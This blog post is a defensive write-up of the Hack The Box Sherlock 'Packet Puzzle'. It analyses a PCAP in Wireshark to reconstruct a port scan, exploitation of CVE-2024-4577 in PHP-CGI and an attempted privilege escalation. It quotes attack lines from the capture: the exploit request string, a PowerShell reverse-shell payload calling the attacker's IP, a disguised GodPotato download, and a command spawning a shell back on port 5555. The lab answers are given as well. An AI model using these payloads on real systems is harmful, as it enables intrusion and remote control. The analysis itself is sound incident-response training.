---
date: 2026-04-25T06:07:35-05:00
# description: ""
image: "/images/HTB-PacketPuzzle/Packet_Puzzle.png"
showTableOfContents: true
tags: ["HackTheBox", "Sherlock", "SOC", "wireshark", "pcap-analysis", "mitre-attck", "T1190", "cve-2024-4577", "php", "php-cgi"]
categories: ["Blue Teaming"]
title: "HTB: Packet Puzzle"
type: "post"
---

* Platform: Hack The Box
* Link: [Packet Puzzle](https://app.hackthebox.com/sherlocks/Packet%2520Puzzle) 
* Level: Easy
* Category: SOC
---

# Sherlock Scenario

You are a junior security analyst at a small Japanese cryptocurrency trading company. After detecting suspicious activity on the internal network, you exported a PCAP for further investigation. Analyze this capture to determine whether the environment was compromised and reconstruct the attacker’s actions.

# Executive Summary

This investigation analyzed a network packet capture (PCAP) following the detection of suspicious activity within an internal environment. The objective was to determine whether the system had been compromised and to reconstruct the attacker’s actions.

Analysis revealed that the internal host `192.168.170.128` performed reconnaissance against `192.168.170.130`, identifying `8 open ports`, with `port 22 (SSH)` being the first to respond. The attacker subsequently exploited a vulnerability in a public-facing web application using `CVE-2024-4577`, targeting a system running `PHP 8.1.25`.

Successful exploitation allowed the attacker to execute commands under the context of the victim user, ultimately establishing a reverse shell connection at `2025-01-22 09:47:32`. This activity aligns with the MITRE ATT&CK technique `T1190 (Exploit Public-Facing Application)` for initial access.

Following initial compromise, the attacker attempted privilege escalation by downloading the tool `GodPotato-NET4.exe` and executing it via a disguised binary. The command leveraged token impersonation techniques to obtain SYSTEM-level privileges; however, the attempt and the following error message was produced:

```
Cannot create process Win32Error:2
```

# Task 1 - What is the source IP address of the attacker involved in this Attack?

## Methodology

The analysis began with a high-level review of network activity using Wireshark’s `Statistics` --> `Endpoints` and `Conversations` views.

- The host `192.168.170.130` was identified as the most active system in the capture, having:
    - The highest number of packets exchanged
    - Communication with the largest number of distinct IP addresses

Based on this behavior, `192.168.170.130` was considered the **likely target (victim)**.

![Endpoints view](/images/HTB-PacketPuzzle/most_pkts.png)

![Conversations view](/images/HTB-PacketPuzzle/convos_victim.png)

To determine which host initiated connections toward this system, the following filter was applied:

```
ip.dst == 192.168.170.130 && tcp.flags.syn == 1 && tcp.flags.ack == 0
```

It isolates initial TCP connection attempts (SYN packets) directed at the suspected victim.

## Findings

Only one source IP was observed initiating connections toward `192.168.170.130`: `192.168.170.128`.

![attacker to victim packets](/images/HTB-PacketPuzzle/attk_vict.png)

Further inspection of the filtered traffic revealed:

- Rapid transmission of SYN packets
- Multiple destination ports targeted (e.g., 21, 22, 25, 53, 110, 443, 8080)
- Absence of completed TCP handshakes

![SYN packets sent](/images/HTB-PacketPuzzle/many_SYN.png)

This pattern is characteristic of a TCP SYN port scan, a common reconnaissance technique used by attackers to identify open services on a target system.

## Conclusion

The host `192.168.170.128` is identified as the source of the attack. Its behavior, specifically the systematic scanning of multiple ports on `192.168.170.130` indicates active reconnaissance activity.

# Task 2 - How many open ports did the attacker discover on the victim's system?

In a SYN scan:

|Behavior|Meaning|
|---|---|
|SYN → SYN/ACK → RST|✅ **Port is OPEN**|
|SYN → RST|❌ **Port is CLOSED**|

## Methodology

Following the identification of `192.168.170.128` as the attacker and `192.168.170.130` as the victim, the next step was to determine which ports were successfully identified as open during the scan.

In a TCP SYN scan, an open port is indicated by a SYN-ACK response from the target. To isolate these responses, the following Wireshark filter was applied:

```
ip.src == 192.168.170.130 && ip.dst == 192.168.170.128 && tcp.flags.syn == 1 && tcp.flags.ack == 1
```

It displays packets where the victim (`192.168.170.130`) responds to the attacker with both SYN and ACK flags set, confirming that the corresponding destination port is open.

![Open ports found](/images/HTB-PacketPuzzle/open_ports.png)

## Findings

Analysis of the filtered traffic revealed multiple SYN-ACK responses from the victim to the attacker. By examining the source ports (`tcp.srcport`) in these packets and counting unique values, a total of: 8 distinct open ports were identified on the victim system.

## Conclusion

The attacker successfully discovered **8 open ports** on the target host `192.168.170.130` during the reconnaissance phase.

# Task 3 - What is the first open port that responded on the victim's system during reconnaissance?

## Methodology

To determine the first open port discovered by the attacker, the analysis focused on responses from the victim (`192.168.170.130`) indicating open ports during the SYN scan.

The filter applied previously shows all the ports which responsed with both SYN and ACK flags signaling that they were opened. The results were then sorted by the `Time` column to identify the earliest response.

## Findings

The earliest SYN-ACK packet observed corresponds to the following connection:

- Source: `192.168.170.130`
- Destination: `192.168.170.128`
- Port: 22 (SSH)

This indicates that port 22 was the first open port identified by the attacker during the reconnaissance phase.

![port 22 first discovered](/images/HTB-PacketPuzzle/open_ports.png)

## Conclusion

The first open port that responded on the victim’s system is: **22**.

# Task 4 - What is the CVE identifier for the vulnerability exploited by the attacker?

## Methodology

Following the reconnaissance phase, the next step was to analyze application-layer traffic to identify potential exploitation attempts.

To isolate HTTP POST requests which are commonly used to deliver exploit payloads, the following Wireshark filter was applied:

```
http.request.method == "POST"
```

This revealed repeated POST requests originating from the attacker (`192.168.170.128`) targeting the victim (`192.168.170.130`).

![POST requests sent](/images/HTB-PacketPuzzle/POST_reqs.png)

## Findings

A recurring HTTP POST request was identified with the following structure:
```
POST /?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1
```

Key observations:

- The request includes encoded parameters:
    - `allow_url_include=1`
    - `auto_prepend_file=php://input`
- These directives attempt to modify PHP runtime configuration
- The payload is designed to force the server to execute code supplied in the HTTP request body

This pattern is indicative of an exploitation attempt targeting a **PHP-CGI argument injection vulnerability**, where specially crafted query strings are interpreted as command-line options by the PHP interpreter.

![CVE-2024-4577](/images/HTB-PacketPuzzle/CVE-2024-4577.png)

## Analysis

The structure and behavior of the request closely match exploitation techniques associated with: CVE-2024-4577.

> A google lookup of the specific POST request leads to `CVE-2024-4577`.

This vulnerability affects PHP running in CGI mode and allows attackers to bypass input validation mechanisms by injecting command-line arguments, leading to remote code execution (RCE).

The repeated nature of the requests suggests automated exploitation attempts against the target system.

## Conclusion

The attacker exploited a PHP-CGI argument injection vulnerability identified as: `CVE-2024-4577`.

This vulnerability enables remote code execution by injecting malicious directives into PHP configuration parameters via crafted HTTP requests.

# Task 5 - What is the name and version of the vulnerable product exploited to get RCE?

## Methodology

To further investigate the exploitation phase, HTTP POST requests initiated by the attacker were analyzed using the following Wireshark filter:
```
http.request.method == "POST"
```

One of the identified requests was selected, and its full interaction was examined using `Follow --> TCP Stream` in Wireshark. This allowed reconstruction of the request and corresponding server response.

## Findings

Within the TCP stream, the attacker was observed executing the command:
```
whoami /all
```

The server’s response included system-level information, confirming successful remote command execution. Additionally, the response disclosed details about the underlying application environment, including the PHP version in use: PHP 8.1.25.

![php version](/images/HTB-PacketPuzzle/php_ver.png)

## Analysis

The presence of command execution output confirms that the attacker successfully exploited the target system to achieve remote code execution (RCE).

The identified PHP version (`8.1.25`) aligns with the previously observed exploitation technique associated with `CVE-2024-4577`, a PHP-CGI argument injection vulnerability affecting certain PHP configurations.

## Conclusion

The vulnerable product exploited by the attacker is: `PHP version 8.1.25`.

This version was running on the target system and was leveraged to achieve remote code execution.

# Task 6 - What is the username of the victim account?

The packet used for the previous task shows the output of the `whoami /all` command. The username of the victim account is: `cristo`.

![username](/images/HTB-PacketPuzzle/username.png)


# Task 7 - At what timestamp did the attacker execute the command to gain their initial foothold on the victim system?

## Methodology

To identify when the attacker gained initial access, HTTP POST requests were analyzed using the following Wireshark filter:
```
http.request.method == "POST"
```

## Findings

The TCP stream revealed a malicious PHP payload executing a PowerShell-based reverse shell:
```PHP
<?php system('powershell -NoP -NonI -W Hidden -Exec Bypass -Command "... TCPClient(\'192.168.170.128\',4545) ..."'); ?>
```

![reverse shell command](/images/HTB-PacketPuzzle/revshell_php.png)

Key observations:

- The payload establishes a reverse connection back to the attacker (`192.168.170.128`) on port `4545`
- It enables remote command execution by continuously reading and executing commands from the attacker
- This confirms successful exploitation and establishment of an interactive foothold

To determine the exact time of this event, the packet details were inspected in the `Frame section`. The `Arrival Time` field shows:
`Jan 22, 2025 04:47:32.295911000 EST`

Converted to UTC, this corresponds to: 2025-01-22 09:47:32.

![Foothold timestamp](/images/HTB-PacketPuzzle/time_foothold.png)

## Analysis

The presence of a reverse shell payload indicates the precise moment the attacker transitioned from exploitation to **active control of the system**. This marks the initial foothold, as the attacker established a persistent command execution channel.

## Conclusion

The attacker executed the command to gain initial access at: `2025-01-22 09:47:32`.

# Task 8 - What is the MITRE ATT&CK technique ID used by the attacker to gain an initial foothold?

## Methodology

Following the identification of the exploited vulnerability (CVE-2024-4577) and analysis of the malicious HTTP POST requests, the attacker’s behavior was mapped to the `MITRE ATT&CK framework` to classify the technique used for initial access.

## Findings

The attacker leveraged a specially crafted HTTP request to exploit a vulnerability in a public-facing web application (PHP-CGI), resulting in the execution of arbitrary commands on the target system. This included the deployment of a PowerShell-based reverse shell, granting the attacker remote access to the host.

## Analysis

This activity aligns with the MITRE ATT&CK technique:

> [T1190](https://attack.mitre.org/techniques/T1190/)

This technique describes scenarios where attackers exploit vulnerabilities in externally accessible applications (e.g., web servers) to gain initial access to a system.

## Conclusion

The attacker gained initial foothold using: `T1190 — Exploit Public-Facing Application`.

# Task 9 - What is the name of the malicious executable the attacker downloaded and executed in memory to facilitate privilege escalation on the endpoint?

## Methodology

Following the identification of a reverse shell connection between the victim (`192.168.170.130`) and the attacker (`192.168.170.128`) over TCP port `4545`, the focus shifted to analyzing post-exploitation activity.

![reverse shell port](/images/HTB-PacketPuzzle/shell_port.png)

To isolate this command-and-control (C2) communication channel, the following Wireshark filter was applied:
```php
tcp.port == 4545
```

A packet within this stream was selected and examined using Follow ---> TCP Stream to reconstruct the interactive session between the attacker and the compromised host.

## Findings

Within the reconstructed PowerShell session, the attacker executed the following command:
```
iwr -uri "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe" -Outfile TimeProvider.exe
```

![GodPotato](/images/HTB-PacketPuzzle/GodPotato.png)

Key observations:

- The command uses `iwr` (Invoke-WebRequest) to download a remote executable
- The file is retrieved from a public GitHub repository
- The downloaded file is saved locally as `TimeProvider.exe`, likely to evade detection
- The original executable name is clearly identifiable in the URL: GodPotato-NET4.exe

## Analysis

The downloaded executable, GodPotato-NET4.exe, is a known privilege escalation tool that exploits Windows token impersonation vulnerabilities. Its presence in the attack chain indicates the attacker’s intent to escalate privileges after gaining initial access.

Although the file is saved under a different name (`TimeProvider.exe`), the actual tool being deployed is determined from the source URL.

## Conclusion

The malicious executable used by the attacker for privilege escalation is: `GodPotato-NET4.exe`

# Task 10 - What is the command line used by the attacker while performing privilege escalation?


## Methodology

Following the identification of the malicious executable used for privilege escalation, the next step involved analyzing how the attacker executed the tool on the compromised system.

The reverse shell communication channel between the attacker (`192.168.170.128`) and the victim (`192.168.170.130`) was isolated using the following Wireshark filter:

```
tcp.port == 4545
```

A packet within this stream was inspected using Follow --> TCP Stream to reconstruct the attacker’s interactive PowerShell session.

## Findings

Within the TCP stream, the attacker executed the previously downloaded executable (`TimeProvider.exe`, corresponding to GodPotato-NET4.exe) with the following command:

```
./TimeProvider.exe -cmd "time.exe 192.168.170.128 5555 -e cmd"
```

Additional output in the stream confirms:

- Successful interaction with Windows RPC/DCOM mechanisms
- Token impersonation activity
- Escalation from `NT AUTHORITY\NETWORK SERVICE` to `NT AUTHORITY\SYSTEM`


![privilege escalation command](/images/HTB-PacketPuzzle/privesc_cmd.png)

## Analysis

The command leverages the GodPotato privilege escalation tool to:

- Exploit Windows token impersonation
- Execute a secondary payload (`time.exe`)
- Establish a new command execution channel back to the attacker on port `5555`

This demonstrates a typical post-exploitation workflow:

1. Download privilege escalation tool
2. Execute tool with custom command
3. Attempt to spawn a higher-privileged shell


## Conclusion

The command line used by the attacker during privilege escalation is:

```
./TimeProvider.exe -cmd "time.exe 192.168.170.128 5555 -e cmd"
```

# Task 11 - The attacker failed to escalate privileges and was given an error. What is the error?

## Methodology

To determine why the privilege escalation attempt failed, the reverse shell communication between the attacker (`192.168.170.128`) and the victim (`192.168.170.130`) was analyzed.

The relevant traffic was isolated using:
```
tcp.port == 4545
```

The TCP stream was then reconstructed via Follow --> TCP Stream to review the full output of the executed privilege escalation command.

## Findings

The output of the executed command (`TimeProvider.exe`, corresponding to GodPotato-NET4.exe) showed successful token impersonation steps, including escalation to: `NT AUTHORITY\SYSTEM`.

However, the process ultimately failed during execution, producing the following error message:

```
Cannot create process Win32Error:2
```

![error message](/images/HTB-PacketPuzzle/error_msg.png)


## Analysis

The error **Win32Error:2** typically indicates: `The system cannot find the file specified.`.

This suggests that while the privilege escalation mechanism successfully obtained a SYSTEM-level token, it failed when attempting to spawn the specified process (`time.exe`). This may be due to:

- The executable not being present on the system
- An incorrect path
- Execution context limitations

## Conclusion

The error encountered during the privilege escalation attempt is:

```
Cannot create process Win32Error:2
```

# Additional Resources

Exploitation of `CVE-2024-4577` is documented in [HTB: Giveback](https://scorpiosec.com/posts/htb-giveback/).
* IppSec: [Giveback video](https://www.youtube.com/watch?v=wNKWDKleH04&t=216s)
* 0xdf: [Giveback write up](https://0xdf.gitlab.io/2026/02/21/htb-giveback.html#)


